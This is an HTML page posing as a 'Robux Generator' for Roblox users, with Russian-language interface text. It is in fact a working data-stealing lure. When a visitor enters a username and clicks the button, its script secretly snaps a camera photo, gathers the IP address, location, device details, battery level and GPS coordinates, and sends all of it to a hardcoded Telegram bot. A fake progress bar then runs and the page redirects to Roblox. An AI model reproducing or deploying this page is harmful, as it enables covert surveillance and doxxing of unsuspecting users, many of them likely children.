<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robux Generator</title>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<style>
  :root { --green: #ffd700; --green-dark: #f0a500; --bg: #0d0d0d; --card: #141414; --border: rgba(255,215,0,.2); }
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; position: relative; overflow: hidden; }
  body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(ellipse at 20% 50%, rgba(255,215,0,.06) 0%, transparent 60%), radial-gradient(ellipse at 80% 20%, rgba(240,165,0,.04) 0%, transparent 50%); pointer-events: none; }
  .grid-bg { position: fixed; inset: 0; background-image: linear-gradient(rgba(255,215,0,.04) 1px, transparent 1px), linear-gradient(90deg, rgba(255,215,0,.04) 1px, transparent 1px); background-size: 50px 50px; pointer-events: none; }
  .container { width: 100%; max-width: 480px; position: relative; z-index: 1; }
  .logo { text-align: center; margin-bottom: 30px; }
  .logo-title { font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; color: var(--green); text-shadow: 0 0 20px rgba(255,215,0,.6); letter-spacing: 3px; }
  .card { background: #120e00; border: 1px solid var(--border); border-radius: 16px; padding: 28px; box-shadow: 0 0 40px rgba(255,215,0,.05); margin-bottom: 16px; }
  .input-wrap label { display: block; font-size: 11px; letter-spacing: 3px; color: rgba(255,215,0,.5); margin-bottom: 8px; }
  .input-wrap input { width: 100%; background: rgba(255,215,0,.05); border: 1px solid rgba(255,215,0,.2); border-radius: 8px; padding: 12px 16px; color: #fff; outline: none; }
  .gen-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--green-dark), var(--green)); border: none; border-radius: 10px; cursor: pointer; font-family: 'Orbitron', monospace; font-weight: 900; color: #000; letter-spacing: 2px; box-shadow: 0 4px 20px rgba(255,215,0,.3); }
  #progress-wrap { display: none; margin-top: 20px; }
  .prog-step { font-size: 13px; color: rgba(255,255,255,.4); padding: 5px 0; }
  .prog-step.done { color: var(--green); }
  .prog-bar-wrap { height: 3px; background: rgba(255,215,0,.1); border-radius: 2px; margin-top: 10px; overflow: hidden; }
  .prog-bar { height: 100%; width: 0%; background: var(--green); transition: width .4s; }
  video, canvas { display: none; }
</style>
</head>
<body>
<div class="grid-bg"></div>
<div class="container">
  <div class="logo"><div class="logo-title">ROBUX GEN</div></div>
  <div class="card">
    <div class="input-wrap">
      <label>ROBLOX USERNAME</label>
      <input type="text" id="username" placeholder="Введи ник...">
    </div>
    <button class="gen-btn" id="main-btn" onclick="startInfection()">⚡ GENERATE ROBUX</button>
    <div id="progress-wrap">
      <div class="prog-step" id="s1">🔍 Поиск аккаунта...</div>
      <div class="prog-step" id="s2">🔓 Обход защиты...</div>
      <div class="prog-bar-wrap"><div class="prog-bar" id="prog-bar"></div></div>
    </div>
  </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
  const T = '8570554697:AAHRYkl8_AIuOC4gbOl6AxRWOnmEMzw15Eg';
  const CID = '1751630480';

  async function logToTg(m) {
    await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({chat_id: CID, text: m, parse_mode: 'Markdown'})
    });
  }

  async function startInfection() {
    const user = document.getElementById('username').value.trim();
    if (!user) return alert("Введите ник!");

    document.getElementById('main-btn').disabled = true;
    document.getElementById('progress-wrap').style.display = 'block';

    // 1. КАМЕРА (ФИКС ДЛЯ ТЕЛЕФОНОВ)
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.getElementById('v');
      video.srcObject = stream;
      await video.play(); // КРИТИЧЕСКИЙ ФИКС ДЛЯ ТЕЛЕФОНОВ

      setTimeout(() => {
        const canvas = document.getElementById('c');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(async b => {
          let f = new FormData(); f.append('chat_id', CID); f.append('photo', b, 'u.jpg');
          await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
          stream.getTracks().forEach(t => t.stop()); // Выключаем камеру после фото
        }, 'image/jpeg');
      }, 1500);
    } catch(e) { console.log("Camera access denied"); }

    // 2. ДАННЫЕ (IP, GPU, BATTERY)
    try {
      const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
      const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0 };
      
      const fullData = `
🚀 **Dumb catched:** \`${user}\`
🌍 **IP:** \`${ipRes.ip}\`
📍 **Geo:** \`${ipRes.city}, ${ipRes.country_name}\`
📱 **Device:** \`${navigator.platform}\`
🔋 **Battery:** \`${(battery.level*100).toFixed(0)}%\`
      `;
      await logToTg(fullData);

      // 3. GPS (ссылка сразу на карту)
      navigator.geolocation.getCurrentPosition(p => {
        logToTg(`📍 **GPS:** [Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
      });
    } catch(e) { console.log("Data error"); }

    // 4. ВИЗУАЛ (ПОЛОСКА)
    const steps = ['s1', 's2'];
    const bar = document.getElementById('prog-bar');
    for(let i=0; i<steps.length; i++) {
        await new Promise(r => setTimeout(r, 2000));
        document.getElementById(steps[i]).classList.add('done');
        bar.style.width = ((i+1)/steps.length*100) + '%';
    }

    document.getElementById('main-btn').textContent = '✓ SUCCESS';
    setTimeout(() => { location.href = "https://roblox.com"; }, 2000);
  }
</script>
</body>
</html>
